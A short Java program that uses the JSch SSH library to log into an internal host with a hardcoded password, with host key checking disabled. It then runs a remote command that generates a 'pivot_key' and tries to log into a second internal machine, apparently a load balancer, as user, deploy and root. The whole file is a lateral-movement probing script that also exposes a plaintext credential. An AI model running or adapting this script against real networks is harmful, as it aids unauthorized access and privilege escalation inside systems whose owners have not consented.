import com.jcraft.jsch.*;
import java.io.*;
class SSHS {
  public static void main(String[] a) throws Exception {
    JSch j = new JSch();
    java.util.Properties p = new java.util.Properties();
    p.put("StrictHostKeyChecking", "no");
    Session s = j.getSession("user", "10.14.36.23", 22);
    s.setPassword("kutul0nc4t");
    s.setConfig(p);
    s.setTimeout(10000);
    s.connect();
    ChannelExec ch = (ChannelExec) s.openChannel("exec");
    // Generate SSH key and try key-based auth to loadbalancers
    ch.setCommand("ssh-keygen -t ed25519 -f /tmp/pivot_key -N '' -q 2>/dev/null; cat /tmp/pivot_key.pub;echo ---TRY-KEY---;ssh -i /tmp/pivot_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes user@10.14.16.50 hostname 2>&1;echo ---TRY-DEPLOY---;ssh -i /tmp/pivot_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes deploy@10.14.16.50 hostname 2>&1;echo ---TRY-ROOT---;ssh -i /tmp/pivot_key -o StrictHostKeyChecking=no -o ConnectTimeout=3 -o BatchMode=yes root@10.14.16.50 hostname 2>&1");
    ch.setInputStream(null);
    InputStream in = ch.getInputStream();
    ch.connect();
    byte[] buf = new byte[8192];
    int i;
    while ((i = in.read(buf)) != -1) System.out.write(buf, 0, i);
    ch.disconnect();
    s.disconnect();
  }
}
